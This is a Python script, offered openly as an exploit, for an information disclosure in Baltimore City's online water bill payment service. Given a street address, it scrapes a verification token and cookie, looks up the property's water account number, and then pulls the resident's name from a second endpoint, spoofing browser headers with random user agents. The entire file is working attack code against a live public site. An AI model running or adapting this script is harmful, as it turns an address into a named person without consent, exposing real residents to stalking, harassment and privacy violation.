#!/usr/bin/python3
# -*- coding: utf-8 -*-

import argparse
import requests
import random
from bs4 import BeautifulSoup

def random_user_agent() -> str:
    UAs = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.520 Safari/537.36",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Safari/537.36,gzip(gfe)",
           "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 ADG/11.0.3112 Safari/537.36"]
    return random.choice(UAs)

def parse_name_from_account_number(html_content: str) -> str:
    soup = BeautifulSoup(html_content, "html.parser")
    name_input = soup.find('input', {'name': 'CustomerName'})
    if name_input:
        return name_input['value'].strip()
    else:
        raise Exception("Customer name not found in the HTML content.")
    

def find_name_from_account_number(account_number: str, rvt: str, anti_forgery_cookie: dict, random_UA: str) -> str:
    key = list(anti_forgery_cookie.keys())[0]
    value = anti_forgery_cookie[key]
    url = "https://pay.baltimorecity.gov/water/_getInfoByAccountNumber"
    headers = {
        "Host": "pay.baltimorecity.gov",
        "Cookie": f"{key}={value}",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://pay.baltimorecity.gov",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": random_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://pay.baltimorecity.gov/water",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i",
        "Connection": "keep-alive"                
    }
    data = f"AccountNumber={account_number}&__RequestVerificationToken={rvt}"
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        return response.text
    else:
        raise Exception(f"Failed to retrieve name: {response.status_code} - {response.text}")
    

def parse_account_number(html_content: str) -> str:
    soup = BeautifulSoup(html_content, "html.parser")
    table = soup.find('table', id='SelectWaterBillModalTable')
    for row in table.find_all('tr')[1:]:
        columns = row.find_all('td')
        if len(columns) > 2:
            account_number = columns[0].get_text(strip=True)
            address = columns[1].get_text(strip=True)
            print(f"Account Number: {account_number}, Address: {address}")
            return account_number


def get_account_number_from_address(address: str, random_UA: str) -> str:
    url = "https://pay.baltimorecity.gov/water/_getInfoByServiceAddress"
    headers = {
        "Host": "pay.baltimorecity.gov",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": random_UA,
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://pay.baltimorecity.gov",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://pay.baltimorecity.gov/water",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i",
        "Connection": "keep-alive"
    }
    data = f"serviceAddress={address}"
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        return response.text
    else:
        raise Exception(f"Failed to retrieve account number: {response.status_code} - {response.text}")


def parse_request_verification_token(html_content: str) -> str:
    '''
    __RequestVerificationToken is a hidden field, we will need this value for a later request.
    '''
    soup = BeautifulSoup(html_content, "html.parser")
    token_input = soup.find('input', {'name': '__RequestVerificationToken'})
    
    if token_input:
        return token_input['value']
    else:
        raise Exception("Verification token not found in the HTML content.")
    

def get_request_verification_token(random_UA: str) -> tuple:
    url = "https://pay.baltimorecity.gov/water"
    headers = {
        "Host": "pay.baltimorecity.gov",
        "User-Agent": random_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        cookies = response.cookies.get_dict()
        return cookies, response.text
    else:
        raise Exception(f"Failed to retrieve verification token: {response.status_code} - {response.text}")

def driver(address: str, random_UA: str) -> None:
    try:
        anti_forgery_cookie, html_response = get_request_verification_token(random_UA)
        if anti_forgery_cookie is None:
            print("Failed to retrieve the anti-forgery cookie.")
            exit(1)
        else:
            print(f"Anti-Forgery Cookie: {anti_forgery_cookie}")

        rvt = parse_request_verification_token(html_response)
        if rvt is None:
            print("Failed to retrieve the request verification token.")
            exit(1)
        else:
            print(f"Request Verification Token: {rvt}")

        account_number = get_account_number_from_address(address, random_UA)
        if account_number is None:
            print("No account number found for the provided address.")
            exit(1)
        else:
            acct_number = parse_account_number(account_number)

        raw_human_name = find_name_from_account_number(acct_number, rvt, anti_forgery_cookie, random_UA)
        if raw_human_name is None:
            print("No name found for the provided account number.")
            exit(1)
        else:
            parsed_human_name = parse_name_from_account_number(raw_human_name)
            print(f"Name associated with account number {acct_number}: {parsed_human_name}")
    except Exception as e:
        print(f"Error retrieving account number: {e}")
        exit(1)



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Get the name of a Baltimore City resident based on an address/account number, due to an information diclosure in the Water Bill service.")
    parser.add_argument("-a", "--address", required=True, type=str, help="The address of the resident.")
    arguments = parser.parse_args()

    address = arguments.address.replace(" ", "+")
    random_UA = random_user_agent()
    driver(address, random_UA)

        